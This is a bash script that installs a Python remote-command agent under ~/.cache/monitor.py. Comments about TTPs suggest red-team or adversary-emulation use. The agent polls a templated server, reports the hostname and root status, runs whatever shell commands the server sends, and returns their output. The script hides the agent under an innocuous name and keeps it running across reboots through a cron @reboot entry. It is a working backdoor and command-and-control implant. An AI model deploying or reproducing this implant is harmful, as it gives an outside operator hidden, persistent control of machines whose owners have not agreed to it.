#!/usr/bin/env bash
set -e

mkdir -p ~/.cache
cat > ~/.cache/monitor.py <<'PYEOF'
import platform
import socket
import subprocess
import time
import requests
import os
import signal

SERVER = "{{ server_url }}"
HOSTNAME = socket.gethostname()
OS_NAME = "linux"

def get_output(cmd):
    try:
        # 1. Always start from a safe, root directory
        os.chdir('/')
        
        # 2. Spawn in a new process group (setsid) so we can kill all children if needed
        proc = subprocess.Popen(
            cmd, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            universal_newlines=True,
            preexec_fn=os.setsid
        )
        
        try:
            # 3. SAFETY TIMEOUT: Never let a TTP hang the entire monitor
            stdout, stderr = proc.communicate(timeout=120)
            return proc.returncode, stdout, stderr
        except subprocess.TimeoutExpired:
            # Kill the entire process group
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except:
                pass
            stdout, stderr = proc.communicate()
            return -1, stdout, stderr + "\n[AGENT] Task timed out and was terminated."
            
    except Exception as e:
        return -1, "", str(e)

# Ground the agent in root
os.chdir('/')

while True:
    try:
        # Minimal checkin - no software inventory noise
        is_privileged = os.getuid() == 0
        response = requests.post(
            f"{SERVER}/api/checkin",
            json={"hostname": HOSTNAME, "os": OS_NAME, "is_privileged": is_privileged},
            timeout=15,
        )
        task = response.json()

        if task.get("status") == "task":
            command = task.get("command", "")
            code, out, err = get_output(command)
            requests.post(
                f"{SERVER}/api/results",
                json={
                    "hostname": HOSTNAME, 
                    "exit_code": code,
                    "output": out,
                    "stderr": err
                },
                timeout=15,
            )
    except Exception:
        pass

    time.sleep(10)
PYEOF

# Persistence setup
(crontab -l 2>/dev/null | grep -v "monitor.py"; echo "@reboot nohup python3 ~/.cache/monitor.py >/dev/null 2>&1 &") | crontab - || true
nohup python3 ~/.cache/monitor.py >/dev/null 2>&1 &
